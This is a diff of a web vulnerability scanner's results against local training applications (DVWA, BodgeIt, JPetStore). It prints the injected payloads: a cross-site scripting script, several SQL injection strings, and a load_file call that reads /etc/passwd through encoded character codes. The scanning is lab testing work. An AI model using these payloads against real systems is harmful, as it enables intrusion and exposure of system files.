@@ -1,51 +1,35 @@
-Vulnerabilities found on http://127.0.0.1/dvwa/vulnerabilities/xss_s/...
-------------------------------------------------------------
 Vulnerabilities found on http://127.0.0.1/dvwa/vulnerabilities/xss_r/...
+------------------------------------------------------------
 	Cross site scripting
 		Form Unamed Form:
 			>"><script>document.cookie="randomcookie=xss";</script>&
 	Improperly Sanitized Data
 		Form Name: Unamed Form
-------------------------------------------------------------
 Vulnerabilities found on http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/...
+------------------------------------------------------------
 	SQL Injection
 		Form :
 		'||'6
 		' OR '1'='1
 		' or 'a'='a
 		1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
-------------------------------------------------------------
 Vulnerabilities found on http://127.0.0.1/dvwa/vulnerabilities/sqli/...
+------------------------------------------------------------
 	SQL Injection
 		Form :
 		'||'6
 		' OR '1'='1
 		' or 'a'='a
 		1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
-------------------------------------------------------------
-Vulnerabilities found on http://127.0.0.1/dvwa/vulnerabilities/exec/...
-------------------------------------------------------------
 Vulnerabilities found on http://127.0.0.1/dvwa/vulnerabilities/brute/...
+------------------------------------------------------------
 	SQL Injection
 		Form :
 		Admin' OR '
-------------------------------------------------------------
 Vulnerabilities found on http://127.0.0.1:8080/bodgeit/search.jsp...
+------------------------------------------------------------
 	Cross site scripting
 		Form Unamed Form:
 			>"><script>document.cookie="randomcookie=xss";</script>&
 	Improperly Sanitized Data
 		Form Name: Unamed Form
-------------------------------------------------------------
-Vulnerabilities found on http://127.0.0.1:8080/bodgeit/advanced.jsp...
-------------------------------------------------------------
-Vulnerabilities found on http://127.0.0.1:8080/bodgeit/register.jsp...
-------------------------------------------------------------
-Vulnerabilities found on http://127.0.0.1:8080/bodgeit/contact.jsp...
-------------------------------------------------------------
-Vulnerabilities found on http://127.0.0.1:8080/jpetstore/actions/Catalog.action...
-------------------------------------------------------------
-Vulnerabilities found on http://127.0.0.1:8080/jpetstore/actions/Account.action;jsessionid=260791120FCAE0598A1C4EFD03D8956B?signonForm=...
-------------------------------------------------------------
-Vulnerabilities found on http://127.0.0.1:8080/jpetstore/actions/Cart.action;jsessionid=260791120FCAE0598A1C4EFD03D8956B?viewCart=...
-------------------------------------------------------------
